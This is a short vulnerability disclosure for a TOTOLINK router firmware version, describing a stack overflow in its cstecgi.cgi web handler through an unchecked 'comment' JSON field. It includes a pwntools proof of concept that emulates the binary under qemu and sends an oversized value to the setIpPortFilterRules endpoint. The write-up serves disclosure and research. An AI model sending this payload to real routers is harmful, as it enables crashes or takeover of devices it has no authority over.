## Overview

- The device's official website: http://www.totolink.cn/home/menu/newstpl.html?menu_newstpl=products&id=2
- Firmware download website: http://www.totolink.cn/home/menu/detail.html?menu_listtpl=download&id=2&ids=36

## Affected version

V4.3.0cu.7647_B20210106

## Vulnerability details

The vulnerability exists in the router's WEB component. `/web_cste/cgi-bin/cstecgi.cgi` `FUN_00418f10` (at address 0x418f10) gets the JSON parameter `comment`, but without checking its length, copies it directly to local variables in the stack, causing stack overflow: 

<img src="img/1.png" alt="1.png" style="zoom:50%;" />

<img src="img/2.png" alt="2.png" style="zoom:50%;" />

## POC

```python
from pwn import *
import json

data = {
    "topicurl": "setting/setIpPortFilterRules",
    "addEffect": "0",
    "ipAddress": "192.168.2.1",
    "comment": "A"*0x200,
    "dFromPort": "8888",
    "dToPort": "9999"
}

data = json.dumps(data)
print(data)

argv = [
    "qemu-mips-static",
    "-g", "1234",
    "-L", "./lib",
    "-E", "LD_PRELOAD=./hook.so",
    "-E", "CONTENT_LENGTH={}".format(len(data)),
    "-E", "REMOTE_ADDR=192.168.2.1",
    "./cstecgi.cgi"
]

a = process(argv=argv)

a.sendline(data.encode())

a.interactive()
```

